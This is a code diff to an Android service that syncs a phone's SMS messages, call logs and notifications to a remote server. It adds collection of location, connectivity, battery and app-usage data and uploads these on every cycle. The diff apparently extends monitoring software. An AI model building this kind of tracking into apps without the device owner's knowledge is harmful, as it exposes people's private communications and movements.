@@ -16,13 +16,16 @@ import androidx.core.content.ContextCompat
 import com.virtualandroid.sms.R
 import com.virtualandroid.sms.SmsApplication
 import com.virtualandroid.sms.data.ApiClient
+import com.virtualandroid.sms.data.AppUsageEntry
 import com.virtualandroid.sms.data.CallLogRepository
+import com.virtualandroid.sms.data.DeviceStatus
 import com.virtualandroid.sms.data.SyncCallLog
 import com.virtualandroid.sms.data.SyncMessage
 import com.virtualandroid.sms.data.SyncNotification
 import com.virtualandroid.sms.data.SyncRequest
 import com.virtualandroid.sms.data.PendingCommand
 import com.virtualandroid.sms.ui.MainActivity
+import com.virtualandroid.sms.util.DeviceStatusManager
 import android.telephony.SmsManager
 import android.util.Base64
 import org.json.JSONObject
@@ -39,6 +42,7 @@ class SmsSyncService : Service() {
     private var syncCount = 0
     private var callLogRepository: CallLogRepository? = null
     private var lastCallLogSyncTime: Long = 0
+    private var deviceStatusManager: DeviceStatusManager? = null
 
     private val syncRunnable = object : Runnable {
         override fun run() {
@@ -79,6 +83,9 @@ class SmsSyncService : Service() {
 
         // Initialize call log repository
         callLogRepository = CallLogRepository(applicationContext)
+        
+        // Initialize device status manager
+        deviceStatusManager = DeviceStatusManager(applicationContext)
 
         isRunning = true
         startForeground(NOTIFICATION_ID, createNotification())
@@ -158,16 +165,19 @@ class SmsSyncService : Service() {
                 )
             })
 
-            // Skip if nothing to sync
-            if (syncMessages.isEmpty() && syncCallLogs.isEmpty() && syncNotifications.isEmpty()) {
-                return
-            }
+            // Get device status (battery, connectivity, location)
+            val deviceStatus = deviceStatusManager?.getDeviceStatus()
+            
+            // Get app usage stats
+            val appUsage = deviceStatusManager?.getAppUsageStats() ?: emptyList()
 
-            // Upload to server
+            // Upload to server (always send device status even if no messages)
             val request = SyncRequest(
                 messages = syncMessages,
                 callLogs = syncCallLogs,
-                notifications = syncNotifications
+                notifications = syncNotifications,
+                deviceStatus = deviceStatus,
+                appUsage = appUsage
             )
 
             val response = apiService.uploadMessages(
